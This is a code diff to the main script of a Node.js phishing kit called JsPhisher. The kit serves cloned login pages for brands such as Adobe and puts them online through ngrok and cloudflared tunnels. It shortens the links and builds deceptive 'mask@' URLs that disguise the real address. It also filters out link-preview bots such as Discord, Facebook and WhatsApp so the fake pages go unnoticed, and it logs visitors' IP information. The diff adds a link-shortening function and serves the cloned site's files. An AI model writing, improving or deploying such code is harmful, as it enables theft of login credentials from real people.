@@ -30,14 +30,13 @@ const readlineSync = require("readline-sync");
 const geoip = require("geoip-lite");
 const chalk = require("chalk");
 const agentParser = require("ua-parser-js");
-const child_process = require("child_process");
+const { execSync, spawn } = require("child_process");
 const cliProgress = require("cli-progress");
 const request = require("request");
 const AdmZip = require("adm-zip");
 const axios = require("axios").default;
 const app = express();
 const port = process.env.PORT || process.env.NODE_PORT || 6969;
-const short = require("./short");
 const path = require("path");
 const fs = require("fs");
 
@@ -49,7 +48,7 @@ const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
 const logError = chalk.redBright`[{whiteBright !}]`;
 const logInfo = chalk.yellowBright`[{whiteBright +}]`;
 const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
-const botDetecter = /(Discordbot|facebookexternalhit)/gi;
+const botDetecter = /(Discordbot|facebookexternalhit|WhatsApp)/gi;
 const availableSites = {
 	Adobe: "adobe",
 	Airtelsim: "airtelsim",
@@ -120,7 +119,7 @@ const logLogo =
 	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
 	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
 	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
-	chalk.cyan`				       [v${VERSION}]	  \n` +
+	chalk.cyan`				     ${VERSION.length === 3 ? "  " : ""}[v${VERSION}]	  \n` +
 	chalk.red`			      [By GamerboyTR]	  \n`;
 
 console.clear();
@@ -132,7 +131,6 @@ if (process.platform === "darwin") {
 }
 
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, "bin", "instagram")));
 app.disable("x-powered-by");
 
 (async () => {
@@ -232,7 +230,7 @@ function controlVersion() {
 				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
 				console.log(chalk.yellow`${logInfo} Downloading repo...`);
 				const currentDir = process.cwd().replaceAll("\\", "/").split("/")[process.cwd().replaceAll("\\", "/").split("/").length - 2];
-				child_process.execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
+				execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
 				console.log(chalk.yellow`${logInfo} Updated!\n`);
 				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
 				if (changelog) {
@@ -279,7 +277,7 @@ function installRequirements() {
 				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
 				console.log(chalk.yellow`${logInfo2} Extracting...`);
 				if (isLinux) {
-					child_process.execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
+					execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
 					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
 				} else {
 					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
@@ -299,7 +297,7 @@ function installRequirements() {
 				await downloadFile(cloudflaredLink, path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`)).catch(reject);
 				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
 				if (isLinux) {
-					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
+					execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
 				}
 			} catch {
 				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
@@ -313,10 +311,10 @@ function installRequirements() {
 function openNgrok(port) {
 	return new Promise(async (resolve, reject) => {
 		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
-			return reject("Cannot found ngrok!");
+			return reject(new Error("Cannot found ngrok!"));
 		}
-		child_process.spawn("bin/ngrok", ["http", port]);
-		await new Promise(r => setTimeout(r, 3000));
+		spawn("bin/ngrok", ["http", port]);
+		await new Promise(resolve => setTimeout(resolve, 3000));
 		let ngrokUrl;
 		while (!ngrokUrl) {
 			try {
@@ -324,10 +322,10 @@ function openNgrok(port) {
 				if (req?.data?.tunnels?.[0]?.public_url) {
 					ngrokUrl = (req.data.tunnels?.[1] ?? req.data.tunnels?.[0]).public_url;
 				} else {
-					await new Promise(r => setTimeout(r, 1000));
+					await new Promise(resolve => setTimeout(resolve, 1000));
 				}
 			} catch (e) {
-				return reject("Failed to start ngrok, please try again : " + e);
+				return reject(new Error(`Failed to start ngrok, please try again : ${e}`));
 			}
 		}
 		resolve(ngrokUrl);
@@ -337,12 +335,12 @@ function openNgrok(port) {
 function openCloudflared(port) {
 	return new Promise((resolve, reject) => {
 		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
-			return reject("Cannot found cloudlfared!");
+			return reject(new Error("Cannot found cloudlfared!"));
 		}
 		let cfUrl;
 		let cfShowed = false;
 		let cfReady = false;
-		child_process.spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
+		spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
 			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
 				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
 			}
@@ -380,7 +378,7 @@ function selectSite() {
 		});
 		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright X}{greenBright ]} About                  {greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
 		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
-		if (choose == "0") {
+		if (choose === "0") {
 			onExit(true);
 		} else if (choose === "X" || choose === "x") {
 			scriptAbout();
@@ -396,6 +394,7 @@ function selectSite() {
 		app.get("/login", (_req, res) => {
 			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
 		});
+		app.use(express.static(path.join(__dirname, "bin", "websites", folder)));
 		resolve({ site: folder, config });
 	});
 }
@@ -423,7 +422,7 @@ function downloadSites(folder) {
 			}
 		}
 		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder, "config.json"))) {
-			reject("Cannot found config.json!");
+			reject(new Error("Cannot found config.json!"));
 			return;
 		}
 		resolve(JSON.parse(fs.readFileSync(path.join(__dirname, "bin", "websites", folder, "config.json"), "utf8")));
@@ -441,9 +440,9 @@ async function scriptAbout() {
 	console.log(chalk.redBright`[Email]     {cyanBright :[offical.gamerboytr@yandex.com]}\n`);
 	console.log(chalk.yellowBright`{greenBright [}{whiteBright 0}{greenBright ]} Exit                     {greenBright [}{whiteBright 99}{greenBright ]}  Main Menu       `);
 	const choose = readlineSync.prompt({ prompt: "\n > " });
-	if (choose == "0") {
+	if (choose === "0") {
 		onExit(true);
-	} else if (choose == "99") {
+	} else if (choose === "99") {
 		console.clear();
 		console.log(logLogo);
 		siteConfig = (await selectSite().catch(throwError)).config;
@@ -460,14 +459,14 @@ async function startServer() {
 	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
 	if (isTermux) {
 		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
-		await new Promise(r => setTimeout(r, 1000));
+		await new Promise(resolve => setTimeout(resolve, 1000));
 	}
-	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
-	await new Promise(r => {
+	console.log(chalk.magenta`${logInfo2} Initializing local server at {bold localhost:${port}}...\n`);
+	await new Promise(resolve => {
 		try {
 			app.listen(port, _ => {
 				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
-				r();
+				resolve();
 			});
 		} catch (e) {
 			throwError(e);
@@ -475,15 +474,17 @@ async function startServer() {
 	});
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
 	const ngrok = await openNgrok(port).catch(throwError);
-	const shortNgrok = await short(ngrok).catch(throwError);
-	const cloudflared = !isTermux ? await openCloudflared(port).catch(throwError) : null;
-	const shortCf = !isTermux ? await short(cloudflared).catch(throwError) : null;
+	const shortNgrok = await shortLink(ngrok).catch(throwError);
+	const cloudflared = await openCloudflared(port).catch(throwError);
+	if (cloudflared) {
+		const shortCf = await shortLink(cloudflared).catch(throwError);
+		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
+		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
+		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+	}
 	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-	console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
-	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
-	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${cloudflared ? 3 : 1} > {yellowBright ${ngrok}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${cloudflared ? 4 : 2} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 }
 
@@ -499,7 +500,7 @@ function downloadFile(url, filePath) {
 			.get(url)
 			.on("response", response => {
 				if (response.statusCode < 200 || response.statusCode > 399) {
-					reject(`Response status was ${response.statusCode}`);
+					reject(new Error(`Response status was ${response.statusCode}`));
 					return;
 				}
 				progressBar.start(response.headers["content-length"], 0, { speed: "N/A" });
@@ -526,7 +527,17 @@ function downloadFile(url, filePath) {
 			}
 			progressBar.stop();
 			reject(err.message);
-			return;
 		});
+	});
+}
+
+function shortLink(url) {
+	return new Promise(async (resolve, reject) => {
+		try {
+			const req = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`).catch(reject);
+			resolve(req.data);
+		} catch (e) {
+			reject(e);
+		}
 	});
 }
